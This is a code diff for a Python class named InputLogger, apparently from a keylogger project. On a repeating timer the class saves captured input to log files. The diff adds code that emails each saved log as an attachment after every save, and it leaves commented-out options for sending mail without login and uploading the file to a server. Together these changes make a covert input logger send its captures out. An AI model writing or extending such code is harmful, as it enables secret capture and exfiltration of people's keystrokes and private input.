@@ -2,9 +2,15 @@ import threading
 import json
 
 import utils
-
+import socket
+import os
+import uuid
+import re
+import hashlib
 from log import Log, Record
 from constants import DEFAULT_LOG_MODE, LOG_DIR
+from server import upload_file
+from mail import send_mail_with_attachment, send_mail_wo_login, send_mail_with_attachment_without_login
 
 class InputLogger(threading.Thread):
     def __init__(self, time_interval=10):
@@ -23,14 +29,26 @@ class InputLogger(threading.Thread):
         if mode == 'json':
             filename = self.generate_filename(filename, mode)
             self.save_json(filename)
+            """
+            TODO: send file via email
+            """
+            print("input logger: ", filename)
+            send_mail_with_attachment(filename)
+            # send_mail_with_attachment_without_login(filename)
+            # send_mail_wo_login()
         elif mode == 'text':
             filename = self.generate_filename(filename, mode)
             self.save_text(filename)
+            # send_mail_with_attachment_without_login(filename)
+            """
+            TODO: send file via email
+            """
+            send_mail_with_attachment(filename)
+            # send_mail_wo_login()
         else:
             raise ValueError('No such log option')
 
         self.clear_buffer()
-
 
     def generate_filename(self, filename, mode):
         if mode == 'json':
@@ -60,7 +78,10 @@ class InputLogger(threading.Thread):
     def save_log_every_timeframe(self, filename, mode=DEFAULT_LOG_MODE):
         threading.Timer(self.interval, self.save_log_every_timeframe, [filename]).start()
         self.save_log(LOG_DIR + filename, mode)
-    
+        
+        # sendmail(filename)
+        
+        # upload_file(filename)
     
     def stop(self):
         self._stop_event.set()
@@ -68,4 +89,3 @@ class InputLogger(threading.Thread):
     def stopped(self):
         return self._stop_event.is_set()
 
-    
